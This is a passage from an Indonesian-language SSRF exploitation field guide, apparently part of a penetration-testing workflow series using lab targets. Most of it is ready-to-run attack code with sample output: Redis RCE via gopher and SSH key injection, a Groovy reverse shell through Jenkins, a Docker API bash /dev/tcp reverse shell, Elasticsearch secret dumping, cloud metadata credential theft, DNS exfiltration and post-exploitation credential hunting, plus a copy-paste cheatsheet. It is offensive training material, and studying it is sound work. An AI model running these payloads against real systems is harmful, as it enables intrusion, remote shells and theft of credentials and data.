    echo "$content" | tee -a ~/ssrf_loot/creds/file_loot.txt
  fi
done
```

**OUTPUT BERHASIL ✅ — gopher:// Supported:**

text

```
PROTO: gopher://127.0.0.1:6379/_PING%0d%0a → code=200 size=7 | +PONG
```

➡️ **JACKPOT! Redis accessible via gopher! Lanjut ke Fase 6A**

---

## ═══════════════════════════════════════

## FASE 4: BLIND SSRF EXPLOITATION

## ═══════════════════════════════════════

> **Masuk sini jika SSRF confirmed (ada callback) tapi tidak ada response body yang bisa dibaca.**

### Langkah 4.1 — Semi-Blind Port Scanning via Timing

Bash

```
# Bahkan tanpa response body, timing dan status code bisa jadi oracle
cat > ~/ssrf_loot/scripts/blind_port_scan.sh << 'SCRIPT'
#!/bin/bash
SSRF_ENDPOINT="$1"
SSRF_PARAM="$2"
BASE_URL="$3"  # e.g., http://127.0.0.1

echo "Port | Code | Size | Time(s) | Classification"
echo "-----|------|------|---------|---------------"

for port in 22 21 25 53 80 443 3000 3306 5000 5432 6379 8000 8080 8443 9000 9200 10250 2375; do
  result=$(curl -sS -o /dev/null \
    -w "%{http_code} %{size_download} %{time_total}" \
    --max-time 5 \
    -X POST "$SSRF_ENDPOINT" \
    --data-urlencode "$SSRF_PARAM=$BASE_URL:$port/" 2>/dev/null)
  
  read code size time <<< "$result"
  
  # Classify
  if echo "$code" | grep -qE "^(200|201|301|302|401|403|404)$"; then
    class="OPEN"
  elif [ "$(echo "$time > 4" | bc 2>/dev/null)" = "1" ]; then
    class="FILTERED/TIMEOUT"
  else
    class="CLOSED"
  fi
  
  printf "%-5s | %-4s | %-5s | %-7s | %s\n" "$port" "$code" "$size" "$time" "$class"
done
SCRIPT

chmod +x ~/ssrf_loot/scripts/blind_port_scan.sh
~/ssrf_loot/scripts/blind_port_scan.sh "$SSRF_ENDPOINT" "$SSRF_PARAM" "http://127.0.0.1"
```

**OUTPUT BERHASIL ✅:**

text

```
Port | Code | Size | Time(s) | Classification
-----|------|------|---------|---------------
80   | 200  | 87   | 0.041   | OPEN
6379 | 502  | 0    | 0.038   | CLOSED
8080 | 200  | 87   | 0.089   | OPEN
9200 | 200  | 87   | 0.055   | OPEN
```

> **⚠️ NOTE:** Size=87 untuk SEMUA open port bisa berarti proxy/WAF mengembalikan generic error page dengan HTTP 200. Selalu manual verify response body!

Bash

```
# Manual verify candidates
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://127.0.0.1:8080/" \
  | head -c 500
```

---

### Langkah 4.2 — Data Exfiltration via DNS (Blind SSRF)

Bash

```
# Jika hanya DNS callback yang bisa diterima, exfil data via DNS subdomain
# Setup interactsh
interactsh-client -v &

# Contoh: Exfil hostname via DNS
# URL: http://HOSTNAME.abc123.oast.fun/
hostname=$(curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=file:///etc/hostname" 2>/dev/null | tr -d '\n' | tr '.' '-')

if [ -n "$hostname" ]; then
  # Jika kita bisa baca file dan trigger outbound request:
  curl -s -X POST $SSRF_ENDPOINT \
    --data-urlencode "$SSRF_PARAM=http://$hostname.$CALLBACK/" 2>/dev/null
  echo "[*] Cek interactsh untuk DNS query: $hostname.$CALLBACK"
else
  echo "[!] File read tidak tersedia, coba DNS exfil via parameter injection"
fi
```

---

## ═══════════════════════════════════════

## FASE 5: SSRF VIA BERBAGAI KONTEKS

## ═══════════════════════════════════════

### Langkah 5.1 — PDF Generator SSRF

Bash

```
# Jika ada endpoint PDF generation, test SSRF via HTML injection
# Buat halaman HTML yang trigger server-side fetch
cat > /tmp/ssrf_pdf_payload.html << 'EOF'
<html>
<head><title>SSRF Test</title></head>
<body>
<h1>PDF SSRF Test</h1>
<!-- Trigger HTTP request to attacker -->
<img src="http://ATTACKER_CALLBACK/pdf-ssrf-test.png">
<!-- Trigger XHR / fetch (if rendered by headless browser) -->
<iframe src="http://127.0.0.1:8080/"></iframe>
<script>
fetch('http://ATTACKER_CALLBACK/js-ssrf-test');
</script>
</body>
</html>
EOF

# Serve payload
python3 -m http.server 9090 --directory /tmp &

# Kirim ke PDF endpoint
curl -i -X POST http://$TARGET/generate-pdf \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"http://$LHOST:9090/ssrf_pdf_payload.html\"}"

# Cek callback
# Jika img src di-fetch → SSRF via PDF confirmed
# Jika iframe content muncul di PDF → SSRF dapat baca internal pages
```

**OUTPUT BERHASIL ✅ — PDF berisi internal content:**

text

```
# PDF yang didownload berisi:
"Internal Admin Dashboard - Welcome admin"
# ATAU callback terima:
GET /pdf-ssrf-test.png HTTP/1.1 from 10.10.11.200
```

---

### Langkah 5.2 — Webhook / Image Fetcher SSRF

Bash

```
# Webhook test
curl -i -X POST http://$TARGET/api/webhook \
  -H "Content-Type: application/json" \
  -d '{"webhook_url": "http://'"$CALLBACK"'/webhook-test"}'

# Image fetcher test (avatar upload dari URL)
curl -i -X POST http://$TARGET/api/profile/avatar \
  -H "Content-Type: application/json" \
  -d '{"image_url": "http://'"$CALLBACK"'/avatar-test.jpg"}'

# Jika berhasil, probe internal
curl -i -X POST http://$TARGET/api/profile/avatar \
  -H "Content-Type: application/json" \
  -d '{"image_url": "http://127.0.0.1:8080/"}'

# Response avatar = internal page content (jika SSRF full)
```

---

## ═══════════════════════════════════════

## FASE 6: EXPLOITATION PATHS

## ═══════════════════════════════════════

### PATH A — SSRF → Redis via Gopher → RCE

> Prasyarat: gopher:// supported, Redis di port 6379, Redis tanpa auth

Bash

```
# STEP A1: Verifikasi Redis accessible
result=$(curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=gopher://127.0.0.1:6379/_PING%0d%0a" | head -c 20)
echo "Redis PING response: $result"
```

**OUTPUT BERHASIL ✅:**

text

```
Redis PING response: +PONG
```

Bash

```
# STEP A2: Info Redis
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=gopher://127.0.0.1:6379/_INFO%0d%0a" \
  | head -c 500

# STEP A3: Generate payload dengan Gopherus
cd /opt && git clone https://github.com/tarunkant/Gopherus.git 2>/dev/null || true
cd Gopherus

# Generate payload untuk write SSH key
echo "[*] Jalankan Gopherus secara interaktif:"
echo "python3 gopherus.py --exploit redis"
echo "Pilih: SSH key injection"
echo "Input: /root/.ssh/ dan authorized_keys"
echo "Paste public key kita"

# MANUAL: Generate SSH key dulu
ssh-keygen -t rsa -b 2048 -f ~/ssrf_loot/ssrf_id_rsa -N "" 2>/dev/null
echo "Public key:" && cat ~/ssrf_loot/ssrf_id_rsa.pub
```

**OUTPUT BERHASIL ✅ — Gopherus generate payload:**

text

```
[+] GopherusURL:
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A...
```

Bash

```
# STEP A4: Kirim payload
GOPHER_PAYLOAD="gopher://127.0.0.1:6379/_%2A1%0D%0A..."  # Dari Gopherus output

curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=$GOPHER_PAYLOAD"

# STEP A5: Coba SSH login
ssh -i ~/ssrf_loot/ssrf_id_rsa root@$TARGET
```

**OUTPUT BERHASIL ✅ — SSH Shell:**

text

```
root@web01:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**OUTPUT GAGAL ❌ — Redis auth required:**

text

```
-ERR NOAUTH Authentication required
```

➡️ Cari password Redis dari file config:

Bash

```
# Cari redis password via file:// SSRF (jika file:// support tersedia)
for config in /etc/redis/redis.conf /etc/redis.conf /opt/redis/redis.conf; do
  curl -s -X POST $SSRF_ENDPOINT \
    --data-urlencode "$SSRF_PARAM=file://$config" | grep "requirepass"
done

# Jika ketemu password, tambahkan AUTH di gopher payload:
# AUTH <password>\r\n → %2A2%0D%0A%244%0D%0AAUTH%0D%0A%24<pass_len>%0D%0A<password>%0D%0A
```

---

### PATH B — SSRF → Jenkins Script Console → RCE

> Prasyarat: Jenkins di port 8080, Script Console accessible (no auth atau punya creds)

Bash

```
# STEP B1: Cek apakah Script Console accessible tanpa auth
result=$(curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://127.0.0.1:8080/script" | head -c 200)
echo "Jenkins /script: $result"
```

**OUTPUT BERHASIL ✅ — Script Console terbuka:**

text

```
<title>Script Console [Jenkins]</title>
<form method="post" action="/script">
```

Bash

```
# STEP B2: Execute Groovy code via SSRF + POST
# MASALAH: SSRF biasanya hanya GET. Perlu workaround.
# Opsi 1: Jika SSRF forward POST body
curl -s -X POST $SSRF_ENDPOINT \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:8080/script",
    "method": "POST",
    "body": "script=def+cmd+%3D+%22id%22.execute()%3B+println+cmd.text"
  }'

# Opsi 2: Jika SSRF bisa GET ke internal API Jenkins
# Jenkins Remote API: /scriptText?script=GROOVY_CODE
GROOVY_CMD="def+cmd+%3D+%22id%22.execute()%3B+println+cmd.text"
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://127.0.0.1:8080/scriptText?script=$GROOVY_CMD"
```

**OUTPUT BERHASIL ✅ — RCE via Jenkins:**

text

```
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

Bash

```
# STEP B3: Upgrade ke reverse shell
# Encode reverse shell Groovy
REVERSE_SHELL_GROOVY='String host="'$LHOST'";int port='$LPORT';String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);};p.destroy();s.close();'

# Setup listener
nc -lvnp $LPORT &

# Trigger reverse shell via SSRF → Jenkins
curl -s -X POST $SSRF_ENDPOINT \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"http://127.0.0.1:8080/scriptText\", \"method\": \"POST\", \"script\": \"$REVERSE_SHELL_GROOVY\"}"
```

---

### PATH C — SSRF → Elasticsearch → Data Exfil

Bash

```
# STEP C1: List semua indices
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://127.0.0.1:9200/_cat/indices?v" \
  | tee ~/ssrf_loot/es_indices.txt

# STEP C2: Dump data dari setiap index
while read line; do
  index=$(echo $line | awk '{print $3}')
  if [[ "$index" != "index" && -n "$index" ]]; then
    echo "=== Dumping index: $index ==="
    curl -s -X POST $SSRF_ENDPOINT \
      --data-urlencode "$SSRF_PARAM=http://127.0.0.1:9200/$index/_search?size=1000" \
      | python3 -m json.tool \
      | grep -iE "(password|secret|token|key|email|user|admin|flag)" \
      | tee -a ~/ssrf_loot/es_dump_$index.txt
  fi
done < ~/ssrf_loot/es_indices.txt

# STEP C3: Cari credentials/secrets
grep -r "password\|secret\|token\|key" ~/ssrf_loot/ | head -50
```

---

### PATH D — SSRF → Docker API → RCE

> Prasyarat: Docker daemon exposed di port 2375 (HTTP, tanpa TLS)

Bash

```
# STEP D1: Verifikasi Docker API
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://127.0.0.1:2375/version" | python3 -m json.tool
```

**OUTPUT BERHASIL ✅:**

JSON

```
{
    "Version": "20.10.17",
    "ApiVersion": "1.41",
    "Os": "linux"
}
```

Bash

```
# STEP D2: List containers dan images
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://127.0.0.1:2375/containers/json" \
  | python3 -m json.tool | grep -E "(Id|Image|Name|Status)"

# STEP D3: Create privileged container dan mount host filesystem
# Ini butuh POST ke Docker API, perlu SSRF yang support POST forwarding
# Atau gunakan Gopherus untuk Docker:
python3 Gopherus/gopherus.py --exploit docker
# Input: command to execute (e.g., 'bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"')
```

---

## ═══════════════════════════════════════

## FASE 7: POST-EXPLOITATION & CREDENTIAL REUSE

## ═══════════════════════════════════════

### Langkah 7.1 — Simpan Credentials & Pivot

Bash

```
# Setelah dapat shell, kumpulkan info untuk lateral movement
# Di dalam shell:
# id && whoami && hostname && ip addr

# Cari credentials di config files
find / -name "*.env" -o -name "*.conf" -o -name "config.php" \
       -o -name "settings.py" -o -name "application.yml" \
       2>/dev/null | xargs grep -iE "(password|secret|key|token)" 2>/dev/null

# Cari private keys
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null

# Cek koneksi aktif (bisa ada database lain yang bisa di-pivot)
ss -tunp
arp -n

# Cross-service credential testing (gunakan credentials dari SSRF loot)
# Simpan creds ke file
cat ~/ssrf_loot/creds/found_creds.txt
```

### Langkah 7.2 — Cross-Service Credential Chart

text

```
Credentials dari SSRF/Cloud Metadata
         │
         ├─ ─→ AWS CLI           → <a href="/docs/aws-pentest" class="text-[#00b4d8] hover:underline font-mono font-semibold">60_aws_pentest_workflow.md</a>
         ├──→ SSH (port 22)     → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
         ├──→ Database (3306)   → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
         ├──→ Database (5432)   → <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
         ├──→ LDAP (389)        → <a href="/docs/ldap" class="text-[#00b4d8] hover:underline font-mono font-semibold">11_ldap_workflow.md</a>
         ├──→ Redis (6379)      → <a href="/docs/redis-and-mongodb" class="text-[#00b4d8] hover:underline font-mono font-semibold">14d_redis_mongodb_workflow.md</a>
         └──→ AD Environment    → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
```

Bash

```
# Test credentials ke semua service
if [ -n "$FOUND_USER" ] && [ -n "$FOUND_PASS" ]; then
  # SSH
  sshpass -p "$FOUND_PASS" ssh -o StrictHostKeyChecking=no "$FOUND_USER@$TARGET" id 2>/dev/null && echo "[+] SSH WORKS"
  
  # MySQL
  mysql -h $TARGET -u "$FOUND_USER" -p"$FOUND_PASS" -e "show databases;" 2>/dev/null && echo "[+] MySQL WORKS"
  
  # Redis
  redis-cli -h $TARGET -a "$FOUND_PASS" ping 2>/dev/null | grep -q PONG && echo "[+] Redis WORKS"
fi
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|Semua port return code=200|WAF/proxy forward generic 200|Compare body SIZE dan content, bukan hanya status code|
|Semua port timeout 5s|Network filtered atau timeout terlalu pendek|Kurangi `--max-time`, scan lebih sedikit port, check timing diff|
|`169.254.169.254` tidak respond|Bukan cloud environment|Skip cloud fase, fokus internal service|
|AWS `401` dari metadata|IMDSv2 enabled|Butuh PUT + custom header — cek apakah SSRF primitive support method injection|
|GCP metadata reject|Missing `Metadata-Flavor: Google` header|Perlu SSRF yang support header injection atau CRLF injection|
|Azure metadata reject|Missing `Metadata: true` header|Sama seperti GCP — butuh header control|
|`file://` tidak bekerja|Fetcher di-restrict ke HTTP/HTTPS saja|Coba `gopher://`, `dict://`|
|`gopher://` tidak bekerja|Library HTTP tidak support gopher|Search: `[framework/language] SSRF gopher disable`|
|Redis gopher response kosong|Double URL encoding issue|Gunakan Gopherus, cek encoding `%` → `%25` jika perlu double encode|
|Redis `NOAUTH` error|Redis punya password|Baca redis.conf via `file://`, tambahkan AUTH di gopher payload|
|Jenkins `/script` HTTP 403|Anonymous access disabled|Cari default creds (admin:admin, admin:password), cek `/login`|
|Docker API HTTP 404|Port berbeda atau API path berbeda|Coba `/v1.41/version`, `/v1.40/version`|
|SSRF hanya GET, target butuh POST|SSRF primitive terbatas|Cari application-level proxy, coba Gopher untuk HTTP POST|
|Redirect tidak diikuti|`--max-redirs 0` atau fetcher tidak follow|Cek fetcher configuration, coba 307/308 redirect|
|`nip.io` tidak resolve|Environment terisolasi, DNS blocked|Gunakan domain sendiri yang pointing ke 127.0.0.1, atau sslip.io|
|AWS credential expired|Token sementara sudah expired|Re-fetch dari metadata endpoint, cek `Expiration` field|
|SSRF hanya bisa internal network|Cannot reach external callback|Gunakan internal service sebagai echo server, bukan external callback|
|Response selalu sama size|Application return generic wrapper|Analisis lebih dalam dengan `jq`, cari nested content/error|

### Jika Buntu Total:

Bash

```
# Search query yang direkomendasikan:
echo "Google: 'SSRF [service/framework yang ditemukan] exploit 2024'"
echo "Google: 'SSRF bypass [error message yang muncul]'"
echo "Google: 'HTB/THM writeup [nama machine] SSRF'"
echo "PortSwigger: https://portswigger.net/web-security/ssrf"
echo "HackTricks: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery"
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: URL Parameter / Feature yang Fetch URL Ditemukan
│
├─ FASE 0: Identifikasi & Konfirmasi SSRF
│   ├─ [Callback received]     → SSRF CONFIRMED
│   │   ├─ [Response body visible] → Full SSRF → FASE 1
│   │   └─ [No body]           → Blind SSRF → FASE 4
│   └─ [No callback]           → Coba encoding/format lain atau skip
│
├─ FASE 1: Localhost & Internal Service Scan
│   ├─ [Localhost accessible]  → Port scan internal
│   │   ├─ [Port 8080 Jenkins] → PATH B (Jenkins RCE)
│   │   ├─ [Port 9200 ES]      → PATH C (Data Exfil)
│   │   ├─ [Port 2375 Docker]  → PATH D (Docker RCE)
│   │   └─ [Port 6379 Redis]   → PATH A (Redis/Gopher RCE)
│   └─ [Localhost blocked]     → FASE 3 (Filter Bypass)
│
├─ FASE 2: Cloud Metadata (Jalankan Paralel)
│   ├─ [AWS IMDSv1 accessible] → Dump IAM credentials → AWS pivot
│   ├─ [GCP accessible]        → Dump service account token
│   └─ [Azure accessible]      → Dump managed identity token
│
├─ FASE 3: Filter Bypass (Jika localhost diblokir)
│   ├─ [IP representation bypass] → Pakai decimal/hex/IPv6
│   ├─ [Redirect bypass]       → Setup redirect server
│   └─ [Protocol bypass]       → file://, gopher://, dict://
│
├─ FASE 4: Blind SSRF
│   ├─ [Timing oracle]         → Port scan via timing diff
│   └─ [DNS exfil]             → Exfil data via DNS subdomain
│
└─ FASE 6: Exploitation
    ├─ [PATH A] Redis → Gopher → RCE/SSH
    ├─ [PATH B] Jenkins → Groovy RCE
    ├─ [PATH C] ES → Data Dump
    └─ [PATH D] Docker → Container Escape RCE
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"
export LPORT="4444"
export SSRF_ENDPOINT="http://$TARGET/fetch"
export SSRF_PARAM="url"
export CALLBACK="abc123.oast.fun"   # Dari interactsh-client
mkdir -p ~/ssrf_loot/{responses,creds,payloads,scripts}

# === CONFIRM SSRF ===
curl -s -X POST $SSRF_ENDPOINT -d "$SSRF_PARAM=http://$CALLBACK/test"
curl -s -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=http://$CALLBACK/test"

# === LOCALHOST PROBE ===
for url in "http://127.0.0.1/" "http://localhost/" "http://[::1]/" "http://2130706433/"; do
  result=$(curl -sS -o /dev/null -w "code=%{http_code} size=%{size_download}" --max-time 5 \
    -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=$url")
  echo "$url → $result"
done

# === CLOUD METADATA ===
curl -s -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=http://169.254.169.254/latest/meta-data/"
curl -s -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# === REDIS VIA GOPHER ===
curl -s -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=gopher://127.0.0.1:6379/_PING%0d%0a"
# Untuk payload kompleks → gunakan Gopherus

# === FILE DISCLOSURE ===
curl -s -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=file:///etc/passwd"
curl -s -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=file:///etc/hosts"
curl -s -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=file:///proc/net/tcp"

# === FILTER BYPASS ===
# IP representations
curl -s -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=http://2130706433:8080/"     # decimal
curl -s -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=http://0x7f000001:8080/"     # hex
curl -s -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=http://[::ffff:127.0.0.1]/" # ipv4-mapped

# Redirect bypass
python3 -m http.server --bind 0.0.0.0 8888 &  # Setup redirect server (edit script)

# === TOOLS ===
interactsh-client                              # OOB callback listener
python3 Gopherus/gopherus.py --exploit redis   # Redis gopher payload
python3 Gopherus/gopherus.py --exploit docker  # Docker gopher payload
python3 SSRFmap/ssrfmap.py --help              # Auto-test SSRF
```

---

> **➡️ NEXT:** Setelah SSRF selesai dan dapat akses internal/credentials, lanjut ke:
> 
> - Cloud credentials → `<a href="/docs/aws-pentest" class="text-[#00b4d8] hover:underline font-mono font-semibold">60_aws_pentest_workflow.md</a>`
> - Redis RCE → `<a href="/docs/redis-and-mongodb" class="text-[#00b4d8] hover:underline font-mono font-semibold">14d_redis_mongodb_workflow.md</a>`
> - Jenkins access → lateral movement ke `<a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>`
> - File disclosure → cari creds → `<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>` atau `[05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)`
> - Selanjutnya dalam seri web: `[Workflow 23 â€” Server-Side Template Injection (SSTI)](/docs/ssti)`